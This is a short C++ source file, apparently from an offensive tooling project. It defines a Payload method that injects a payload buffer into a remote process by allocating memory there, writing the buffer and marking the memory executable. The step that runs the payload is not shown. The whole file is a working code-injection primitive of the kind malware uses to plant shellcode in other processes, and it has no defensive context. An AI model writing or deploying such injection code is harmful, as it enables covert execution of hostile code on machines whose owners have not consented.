#include "PayloadClass.h"

Payload::error_codes Payload::InjectToRemoteProcWriteMem
(
	IN     OPTIONAL HANDLE hTargetProcessHandle
)
{
	LPVOID		lpExtPayloadAddress = nullptr;
	DWORD       dwOldProtection		= NULL;
	SIZE_T	    sBytesWritten		= NULL;
	error_codes ecStatus			= CheckPayloadValidity();

	if (ecStatus != success) return ecStatus;

	if (CheckHandleValidity(hAttachedProcessHandle) != success)
	{
		ecStatus = CheckHandleValidity(hTargetProcessHandle);

		if (ecStatus != success) return ecStatus;

		hAttachedProcessHandle = hTargetProcessHandle;
	}

	lpExtPayloadAddress = VirtualAllocEx(hAttachedProcessHandle, nullptr, sSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	if (lpExtPayloadAddress == nullptr) return virtualProtectExFailed;
	
	lpExternalAddress = lpExtPayloadAddress;

	if (WriteProcessMemory(hAttachedProcessHandle, lpExtPayloadAddress, pData, sSize, &sBytesWritten) == FALSE || sSize != sBytesWritten) return processWriteFailed;

	if (VirtualProtectEx(hAttachedProcessHandle, lpExtPayloadAddress, sSize, PAGE_EXECUTE_READ, &dwOldProtection) == FALSE) return virtualProtectExFailed;

	return ecStatus;
}
